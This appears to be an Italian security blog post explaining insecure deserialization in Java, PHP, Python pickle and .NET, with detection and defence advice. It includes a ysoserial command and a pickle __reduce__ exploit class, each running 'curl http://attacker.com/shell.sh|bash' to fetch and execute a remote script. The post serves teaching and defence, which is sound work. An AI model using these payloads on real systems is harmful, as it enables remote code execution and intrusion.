---
layout: post
title: "Insecure Deserialization: da oggetto serializzato a RCE"
date: 2026-08-28
cat: red
tags: [deserialization, RCE, gadget chain, Java, PHP, Python, red team]
excerpt: "Deserializzare un oggetto non dovrebbe mai equivalere a eseguire codice, eppure in molti linguaggi è esattamente quello che succede se l'input non è affidabile. Una delle classi di vulnerabilità più devastanti e meno intuitive dell'OWASP Top 10."
---

Serializzare un oggetto significa trasformarlo in una sequenza di byte trasportabile (per salvarlo, inviarlo in rete, metterlo in cache). Deserializzarlo significa ricostruirlo. Il problema: molti framework, durante la ricostruzione, **eseguono automaticamente** codice definito dall'oggetto stesso (costruttori, metodi magici, callback), e se l'input serializzato proviene da un utente non fidato, quel codice è sotto il suo controllo.

## Perché è pericolosa

A differenza di una SQL injection o una XSS, la deserialization insicura spesso non richiede di "iniettare" nulla di visibilmente malevolo: basta fornire un oggetto serializzato valido, strutturato per innescare una catena di metodi già presenti nelle librerie caricate dall'applicazione, la cosiddetta **gadget chain**.

## Java: il caso più studiato

```java
// Se l'applicazione fa qualcosa come:
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  // <- punto di innesco
```

Librerie comuni nel classpath (Apache Commons Collections, Spring, Hibernate) contengono classi che, se incatenate correttamente, arrivano a invocare `Runtime.exec()`. Strumenti come **ysoserial** generano automaticamente payload sfruttando gadget chain note:

```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh|bash' > payload.bin
```

Il payload va poi inviato dove l'applicazione deserializza input esterno, spesso in header HTTP, cookie, o campi di API RMI/JMX poco visibili.

## PHP: object injection

```php
// Vulnerabile se $data proviene dall'utente
$obj = unserialize($_COOKIE['data']);
```

PHP usa metodi "magici" (`__wakeup()`, `__destruct()`) invocati automaticamente durante la deserializzazione, se una classe già caricata dall'applicazione ha un `__destruct()` che scrive file o esegue comandi, un attaccante può costruire un oggetto che lo inneschi con parametri a piacere (**POP chain**, Property-Oriented Programming).

## Python: pickle

```python
import pickle
# NON FARE MAI QUESTO con dati non fidati
data = pickle.loads(user_input)
```

`pickle` invoca `__reduce__()` durante la deserializzazione, un oggetto malevolo può definire `__reduce__()` per restituire una chiamata a `os.system()`:

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh|bash',))

payload = pickle.dumps(Exploit())
```

## .NET: ViewState e BinaryFormatter

ASP.NET ViewState, se non protetto da MAC (`EnableViewStateMac`) o se la chiave di validazione è nota/debole, è un classico bersaglio, strumenti come **ysoserial.net** generano payload per `BinaryFormatter`, `ObjectStateFormatter` e altri formatter .NET.

## Come identificarla in fase di test

- Cercare formati riconoscibili nei parametri: Java (`rO0AB...` in base64, header magic `AC ED 00 05`), PHP (`O:8:"stdClass"...`), .NET (`AAEAAAD...`)
- Cookie, header custom, campi nascosti di form, parametri di caching e sessione sono i punti più comuni
- Strumenti come **Burp Suite** con l'estensione **Java Deserialization Scanner**, o **ysoserial**/**ysoserial.net** per generare payload di test

## Come si difende un blue team

- **Non deserializzare mai input non fidato** con formati nativi, usare formati di scambio dati come JSON/Protobuf con schema esplicito, che non eseguono codice arbitrario per costruzione
- Se la deserializzazione nativa è inevitabile: **allowlist di classi deserializzabili** (es. `ObjectInputFilter` in Java 9+)
- **Rimuovere librerie con gadget chain note** dal classpath se non strettamente necessarie
- **Firmare e verificare l'integrità** di ogni payload serializzato prima di deserializzarlo (HMAC), impedendo la manomissione anche se il formato resta prevedibile
- **WAF con firme per magic byte** dei formati di serializzazione più comuni come livello di difesa aggiuntivo, non sostitutivo

## Conclusione

La deserialization insicura ricorda perché "l'input dell'utente è sempre ostile" va applicato anche ai formati che sembrano solo dati, un oggetto serializzato non è mai *soltanto* dati se il linguaggio lo ricostruisce eseguendo codice per farlo.
